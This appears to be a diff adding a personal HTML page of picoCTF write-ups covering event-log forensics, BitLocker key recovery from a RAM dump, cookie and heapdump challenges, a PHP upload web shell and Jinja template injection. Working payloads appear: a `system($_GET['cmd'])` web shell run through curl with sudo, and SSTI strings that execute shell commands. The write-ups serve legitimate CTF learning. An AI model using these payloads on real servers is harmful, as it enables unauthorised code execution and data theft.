+            <p>This did work, returning two strings. The = is a padding character in base64 encoding, so it's quite common for strings of a certain size to get padded with one or two of these when encoded in base64.</p>
+            <pre><code>String: 5			: cGljb0NURntFdjNudF92aTN3djNyXw==
+String: 6			: Immediate Shutdown (MXNfYV9wcjN0dHlfdXMzZnVsXw==)</code></pre>
+            <p>Decoding with CyberChef gives us:</p>
+            <pre><code>picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l</code></pre>
+            <p>We're missing the final chunk, which is a hash unique to each competitor (from what I understand). Grepping for "=" is very impractical, as evxt logs are full of those (by virtue of being some form of XML). However, we know the flag always ends with a curly brace, and that the hash is always 8 characters long.</p>
+            <p>Encoding a dummy string such as ABCDABCD} to base64 in CyberChef shows that the curly bracket becomes 0=</p>
+            <pre><code>$ grep "0=" winlog.txt</code></pre>
+            <pre><code>String: 6			: <base64>0=
+String: 6			: <base64>0=</code></pre>
+            <p>And appending this and going back to CyberChef gives us:</p>
+            <pre><code>picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_XXXXXXXX}</code></pre>
+            <p>Now, what if my idea to look for a base64 encoded string didn't work, or that it was a string that didn't get padded (and thus wouldn't have been revealed by these crude methods)?</p>
+            <p>Well. We're looking at an event log, and the description of what is going on mentions: installers off the Internet, installer executed but seemingly does nothing, and sudden shutdowns.</p>
+            <p>Rather than grep, we could've used a text editor and searched for incriminating strings, such as "Shutdown". Just with that one, we'd get our first chunk of the flag, in the Immediate Shutdown string, and also learn the name of the program installed: <code>Totally_Legit_Program</code></p>
+            <p>Searching for that name and looking at the associated events, we'd eventually find the other two pieces of the flag.</p>
+            <p>Maybe there is an even better way, but this is what I thought of and knew of at the time.</p>
+          </section>
+        </article>
+        <article class="challenge" id="fo-challenge6">
+          <h3>Bitlocker-2</h3>
+          <section class="challenge-desc">
+            <p>300 points</p>
+            <p>Author: Venax</p>
+            <p>This problem cannot be solved in the webshell.</p>
+            <h4>Description</h4>
+            <p>Jacky has learnt about the importance of strong passwords and made sure to encrypt the BitLocker drive with a very long and complex password. We managed to capture the RAM while this drive was opened however. See if you can break through the encryption! Download the disk image here [link expunged] and the RAM dump here [link expunged]</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>We're given a Bitlocker-encrypted disk image (.dd) once again; we must decrypt it and find the flag. This time around, Jacqueline "Jacky" (allegedly) learned the lesson from Bitlocker-1 and has an (allegedly) much better password.</p>
+            <p>I found this quite challenging, but unfortunately less because of any merits of its design and more because I (once again) had to wrangle with the tools necessary to complete this challenge for an absurdly long time. Oh, to be a greenhorn is to suffer.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://github.com/Aorimn/dislocker">Dislocker</a>: Software designed to read Bitlocker-encrypted partitions in Linux.</li>
+                <li><a href="https://github.com/volatilityfoundation/volatility">Volatility2</a>: Volatile memory extraction utility framework. A set of tools to examine RAM dumps. Requires the EOL Python2 and while it has been superseded by <a href="https://github.com/volatilityfoundation/volatility3">volatility3</a>, the plugin we need for this challenge (and all alternative plugins I found) only work on volatility2 :-(
+                <p>Check out <a href="https://gist.github.com/kurtnettle/91c855f619b9c6e0978608ad56f8eac7">this guide</a> to install volatility2 and all its dependencies. I found it supremely helpful.</p></li>
+                <li><a href="https://github.com/breppo/Volatility-BitLocker">Volatility-Bitlocker</a>: A plugin for volatility2 that extracts Full Volume Encryption Keys (FVEK) from volatile memory. Install to the "volatility/plugins" directory and it's ready to use.</li>
+              </ol>
+            </section>
+
+            <p>One could manually sift through the RAM dump with a hex viewer, as some people have done (<a href="https://tribalchicken.net/recovering-bitlocker-keys-on-windows-8-1-and-10">1</a>) (<a href="https://noinitrd.github.io/Memory-Dump-UEFI/">2</a>). I am not bright enough to find the encryption key doing that (I did try, for what is worth).
+            <p>And as my mother often says about things like household appliances, some engineer busted their head designing these wondrous tools to make our lives easier; it's only fair that we benefit from them, no?</p>
+            <p>So let's use volatility. It's pretty easy to get the hang of it, at least for basic CTF usage.</p>
+            <p>I ran these commands from the folder volatility was installed to after following the above guide. I assume you already have everything set up, as noted in the tools section.</p>
+            <pre><code>$ python2 vol.py -f "/home/kali/Downloads/bitlocker-2/memdump.mem" imageinfo</code></pre>
+            <p>This will work for a few seconds and eventually give us some information on our image dump, such as when it was dumped, and most importantly for our purposes the recommended profile to use with future operations in volatility.</p>
+            <pre><code>Volatility Foundation Volatility Framework 2.6.1
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+        Suggested Profile(s) : Win10x64_19041
+                    AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+                    AS Layer2 : FileAddressSpace (/home/kali/Downloads/bitlocker-2/memdump.mem)
+                    PAE type : No PAE
+                          DTB : 0x1ad000L
+                        KDBG : 0xf80251217b20L
+        Number of Processors : 2
+    Image Type (Service Pack) : 0
+              KPCR for CPU 0 : 0xfffff8024f52f000L
+              KPCR for CPU 1 : 0xffffc301a8c67000L
+            KUSER_SHARED_DATA : 0xfffff78000000000L
+          Image date and time : 2024-07-15 19:24:38 UTC+0000
+    Image local date and time : 2024-07-15 12:24:38 -0700</code></pre>
+            <p>Let's check what FVEKs volatility-bitlocker can find on the system, if any.</p>
+            <pre><code>$ python2 vol.py -f "/home/kali/Downloads/bitlocker-2/memdump.mem" bitlocker --profile=Win10x64_19041</code></pre>
+            <p>It finds four candidates. Interestingly enough, one of my crude first attempts at solving involved running the strings command on the memory dump and saving that to a text file for analysis. Looking for "Recovery Key" would lead to four distinct character sequences (either files or registry keys, I'm not sure), but I couldn't find a way to use them effectively with dislocker.</p>
+            <p>Moving on... Let's dump these candidates.</p>
+            <pre><code>$ python2 vol.py -f "/home/kali/Downloads/bitlocker-2/memdump.mem" bitlocker --profile=Win10x64_19041 --dislocker /home/kali/Downloads/bitlocker-2</code></pre>
+            <p>--dislocker is one of the options available in the volatility-bitlocker plugin, and dumps the keys in a format dislocker can use. I chose to dump them into the folder with the memdump.mem and bitlocker-2.dd files, to keep things tidy.</p>
+            <p>Feel free to check the files are there; you should have 4 66-bytes .fvek files.</p>
+            <p>Now, it's time to use dislocker, similarly to how we did back in Bitlocker-1. Create your mountpoints:</p>
+            <pre><code>$ sudo mkdir /media/bitlockermnt</code></pre>
+            <pre><code>$ sudo mkdir /media/bitlockerdecrypt</code></pre>
+            <p>These are the names I used; use the ones you please. Now, to avoid any problems with FUSE permissions, do:</p>
+            <pre><code>$ sudo su -</code></pre>
+            <p>Now you're root. Be careful! Now, we must use dislocker with the -k flag, pointing to where our .fvek files are. How do we know which one is it?</p>
+            <p>...I won't reproduce it here, but I just did it one by one. You know you got it right when the mount command works without problems; any sort of error ('wrong fs' etc.) is sign that the FVEK used did not work, and the resulting dislocker-file is useless.</p>
+            <p>Perhaps someone with the chops would find a way to automate it. This is the one that works:</p>
+            <pre><code># dislocker -k /home/kali/Downloads/bitlocker-2/0x9e8879926a50-Dislocker.fvek /home/kali/Downloads/bitlocker-2/bitlocker-2.dd /media/bitlockerdecrypt</code></pre>
+            <p>Obviously replacing my filepaths with your own. As explained in Bitlocker-1, this will place a file called dislocker-file in /media/bitlockerdecrypt</p>
+            <p>And finally, do:</p>
+            <pre><code># mount -o loop,ro /media/bitlockerdecrypt/dislocker-file /media/bitlockermnt</code></pre>
+            <p>As noted previously, if you got any sort of error while mounting then the FVEK file used with dislocker is incorrect and you should try a different one. If you get 'wrong fs' and add -t ntfs-3g to the mount command all that's gonna do is show a different error that hints that the dislocker-file generated by dislocker is bad.</p>
+            <p>Now that we got a working dislocker-file, we can now explore /media/bitlockermnt</p>
+            <pre><code># ls /media/bitlockermnt</code></pre>
+            <pre><code>'$RECYCLE.BIN'   flag.txt  'System Volume Information'</code></pre>
+            <p>Retrieve the flag as you prefer:</p>
+            <pre><code># cat /media/bitlockermnt/flag.txt</code></pre>
+            <pre><code>picoCTF{B1tl0ck3r_dr1v3_d3crypt3d_XXXXXXXX}</code></pre>
+            <p>And we're done.</p>
+          </section>
+        </article>
+      </article>
+      <article id="webex">
+        <h2>Web Exploitation</h2>
+        <article class="challenge" id="we-challenge1">
+          <h3>Cookie Monster Secret Recipe</h3>
+          <section class="challenge-desc">
+            <p>50 points</p>
+            <p>Author: Brhane Giday and Prince Niyonshuti N.</p>
+            <h4>Description</h4>
+            <p>Cookie Monster has hidden his top-secret cookie recipe somewhere on his website. As an aspiring cookie detective, your mission is to uncover this delectable secret. Can you outsmart Cookie Monster and find the hidden recipe? You can access the Cookie Monster here [link expunged] and good luck</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>An easy challenge that will put to the test your skills using your preferred browser's web developer tools.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://firefox-source-docs.mozilla.org/devtools-user/index.html">Web Developer Tools (Firefox)</a>: Hit <code>F12</code> (or <code>Fn+F12</code>). The developer tools open by default on the inspector, which shows a webpage's HTML source code and lets you edit it. There are many tools, but the one we'll use here is the Web Storage tab.</li>
+              </ol>
+            </section>
+
+            <p>Go to Cookie Monster's webpage, which is quite empty except for a login form.</p>
+            <p>Enter whatever in the fields and submit; Cookie Monster will tease you that he doesn't need a password, only cookies. There's also a hint of where you need to look for the flag...</p>
+            <p>(I'd like to note that the website won't store any cookies until you make a login attempt.)</p>
+            <p>Simply open your web developer toolset (usually F12 across browsers) and check the Web Storage tab (or the equivalent for your preferred browser). You'll have a single cookie named secret_recipe with a very, very long string as a value.</p>
+            <p>The string is the flag, encoded in base64.</p>
+            <pre><code>cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzX[EXPUNGED]fQ%3D%3D</code></pre>
+            <p>Decode it in CyberChef and get your flag:</p>
+            <pre><code>picoCTF{c00k1e_m0nster_l0ves_c00kies_XXXXXXXX}</code></pre>
+          </section>
+        </article>
+        <article class="challenge" id="we-challenge2">
+          <h3>head-dump</h3>
+          <section class="challenge-desc">
+            <p>50 points</p>
+            <p>Author: Prince Niyonshuti N.</p>
+            <h4>Description</h4>
+            <p>Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.</p>
+            <p>Additional details will be available after launching your challenge instance.</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>After firing up the instance, players are dropped into what looks like a small (and rather amateurish) blogging platform. Most links send you back to this page, and most elements aren't interactive at all. The "About Us" and "Services" pages are unrelated to the challenge.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li>None beyond your browser.</li>
+              </ol>
+            </section>
+
+            <p>The description for the challenge has a hint built in: look at the post mentioning API documentation. Hovering over "#API Documentation" shows that this leads to a different page within the server. This link to /api-docs sends us to the dashboard for Swagger (mentioned in the post); our target is the heapdump at the bottom.</p>
+            <p>Open it and click the "Try it out" button, then the "Execute" button, and finally look under "Response Body" and download the file. Despite the extension, it's just a text file -- the flag is inside in plain text.</p>
+            <pre><code>picoCTF{Pat!3nt_15_Th3_K3y_XXXXXXXX}</code></pre>
+            <p>And that's it.</p>
+          </section>
+        </article>
+        <article class="challenge" id="we-challenge3">
+          <h3>n0s4n1ty 1</h3>
+          <section class="challenge-desc">
+            <p>100 points</p>
+            <p>Author: Prince Niyonshuti N.</p>
+            <h4>Description</h4>
+            <p>A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.</p>
+            <p>Additional details will be available after launching your challenge instance.</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>After firing up the instance, you'll be granted access to a tiny web application where you can upload a profile picture. However, as the name of the challenge implies, the image input is not sanitized at all. You can upload anything from images to text files (though that last one, naturally, doesn't display properly as an avatar).</p>
+            <p>After uploading the file, we're given the filepath to our upload, which we're free to check out. Going to the uploads folder is forbidden, though.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://curl.se/">curl</a>: A command line tool for getting or sending data using URL syntax. We'll be using it to send commands to the server.</li>
+              </ol>
+            </section>
+
+            <p>If you upload anything you'll note that we're redirected to /upload.php, where we're informed that our file was successfully uploaded. This web application uses PHP, and it's what we should use in turn to accomplish our goal.</p>
+            <p>After doing some reading [<a href="https://hg8.sh/posts/misc-ctf/upload-restriction-bypass/">1</a>] [<a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">2</a>] on the topic of doing RCE with PHP, the answer turns out to be really simple. This challenge in particular doesn't blacklist PHP files, making it even easier.</p>
+            <p>We can try it out by creating a simple file (name it whatever you want):</p>
+            <pre><code>$ echo "&lt;?=phpinfo();" &gt; cmd.php</code></pre>
+            <p>After we upload this we can go to /uploads/cmd.php, where we'll see a bunch of information on the current state of PHP due to the <a href="https://www.php.net/manual/en/function.phpinfo.php">phpinfo function</a>.</p>
+            <p>Pretty exciting, isn't it? Now, we want a way to be able to execute Linux commands to navigate the server -- since we need to find a flag located in the /root directory.</p>
+            <p>Turns out PHP has a function just perfect for that: <a href="https://www.php.net/manual/en/function.system.php">system()</a>, which allows to execute commands on the server.</p>
+            <p>We can pair that with the superglobal <a href="https://www.php.net/manual/en/reserved.variables.get.php">$_GET</a> to pass variables to the script via URL parameters.</p>
+            <pre><code>$ echo "&lt;?=system($_GET['cmd']);" &gt; cmd.php</code></pre>
+            <p>Basically, "pass the variable 'cmd' to the shell", where 'cmd' can be something like 'ls', or 'cat' or any number of things.</p>
+            <p>Now, upload the file to the web application.</p>
+            <p>Open your terminal, as it's time to use cURL.</p>
+            <pre><code>$ curl &quot;http://standard-pizzas.picoctf.net:[port]/uploads/cmd.php?cmd=sudo%20-l&quot;</code></pre>
+            <p>Note that we need to use URL encoding, so spaces become %20.</p>
+            <p>This will run the command "sudo -l" on the server, which tells us what commands we can run.</p>
+            <pre><code>Matching Defaults entries for www-data on challenge:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User www-data may run the following commands on challenge:
+  (ALL) NOPASSWD: ALL
+  (ALL) NOPASSWD: ALL</code></pre>
+            <p>...Sheesh.</p>
+            <p>Now that we've confirmed that we can just do whatever, let's find that flag.</p>
+            <pre><code>$ curl &quot;http://standard-pizzas.picoctf.net:[port]/uploads/cmd.php?cmd=sudo%20ls%20-a%20/root&quot;</code></pre>
+            <p>We use sudo ls -a in order to show all files, including hidden files in the directory.</p>
+            <pre><code>.
+..
+.bashrc
+.profile
+flag.txt
+flag.txt</code></pre>
+            <p>There it is (...twice)! Now, we can show the contents with cat...</p>
+            <pre><code>$ curl &quot;http://standard-pizzas.picoctf.net:[port]/uploads/cmd.php?cmd=sudo%20cat%20/root/flag.txt&quot;</code></pre>
+            <pre><code>picoCTF{wh47_c4n_u_d0_wPHP_XXXXXXXX}</code></pre>
+            <p>And we're done.</p>
+          </section>
+        </article>
+        <article class="challenge" id="we-challenge4">
+          <h3>SSTI1</h3>
+          <section class="challenge-desc">
+            <p>100 points</p>
+            <p>Author: Venax</p>
+            <h4>Description</h4>
+            <p>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here [link expunged]!</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>The website is very simple. Users are given a text box in which they can write messages to "announce" (meaning that we're sent to a page with our message in very big letters. The messages aren't posted in a way we can see others' or others can see ours.)</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://firefox-source-docs.mozilla.org/devtools-user/index.html">Web Developer Tools (Firefox)</a>: Modern browsers come with built-in web developer tools that allow for things such as network request monitoring, editing the HTML document, JavaScript debugging, etc. etc. This time we'll use the Network Monitor tab.</li>
+              </ol>
+            </section>
+
+            <p>Opening the browser's Network Monitor, refreshing the page and examining the document request headers tells us...</p>
+            <pre><code>Server: Werkzeug/3.0.3 Python/3.8.10</code></pre>
+            <p>The Mozilla Developer Network has <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server">a nice article</a> on this header</p>
+            <p>We now know that this server runs Python and the <a href="https://pypi.org/project/Werkzeug/">Werkzeug web application library</a>, which is in turn associated with the <a href="https://www.palletsprojects.com/projects/flask/">Flask web application framework</a> and the <a href="https://www.palletsprojects.com/projects/jinja">Jinja templating engine</a>. While my (limited) understanding is that each of these projects do not force web developers to use the others, I wouldn't be surprised if it was very common to use all these tools together.</p>
+            <p>"SSTI" in the challenge name means Server-Side Template Injection, by the way. PortSwigger <a href="https://portswigger.net/web-security/server-side-template-injection">has written about it</a>, and HackTricks is a good resource for information on <a href="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html">this topic</a>.</p>
+            <p>Since this is a beginner's challenge, we don't need much other than some light reading. I liked Fortas Abdeldjalil's <a href="https://medium.com/@Fcmam5/ctf-as-a-developer-pt-1-template-engines-ssti-b03c59e2c095">Medium post</a> on the matter, and specially Debjeet's <a href="https://payatu.com/blog/server-side-template-injectionssti/">article</a> at Payatu</p>.
+            <p>Since we're working against a server that uses Python, and specifically uses Werkzeug, which is related to the Flask framework that also may include the Jinja templating engine, we can first try with Jinja expressions.</p>
+            <p>Let's write {{7*7}} in the text input field...</p>
+            <pre><code>49</code></pre>
+            <p>We get 49 in the /announce page, rather than a string saying {{7*7}}</p>
+            <p>Whoops. Now we can get into further mischief. We can crib a line of code from the above article:</p>
+            <pre><code>{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}</code></pre>
+            <pre><code>.: __pycache__ app.py flag requirements.txt ./__pycache__: app.cpython-38.pyc</code></pre>
+            <p>We're injecting Python code. I definitely recommend looking at Debjeet's article for the in-depth explanation of what is going on.</p>
+            <p>We can see that the file with the flag is right there, so all we have to do is modify our payload:</p>
+            <pre><code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}</code></pre>
+            <pre><code>picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_XXXXXXXX}</code></pre>
+          </section>
+        </article>
+      </article>
+    </main><!--main page content-->
+    <a class="skip" href="#page-navigation">Return to page navigation</a>
+    <footer><!--website footer-->
+      <p>Made with vanilla HTML + CSS by shoutvoid</p>
+      <address>
+        <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
+        <a href="https://github.com/ShoutVoid">GitHub</a>
+        <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
+        <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
+      </address>
+    </footer><!--website footer-->
+  </body>
+</html>
+<!--
+          <article class="challenge" id="CA-challenge1">
+            <h3>CHALLENGENAME</h3>
+            <section class="challenge-desc">
+              <p>N points</p>
+              <p>Author: WHATSHERFACE</p>
+              <h4>Description</h4>
+              <p>AAAAAAAAAAAAAAA</p>
+            </section>
+            <section class="writeup">
+              <h4>Write-up</h4>
+              <p>AAA</p>
+              <section class="tools">
+                <h5>Tools</h5>
+                <ol>
+                  <li><a href=AAAA>AAAA</a>: AAA</li>
+                </ol>
+              </section>
+            </section>
+          </article>
+-->
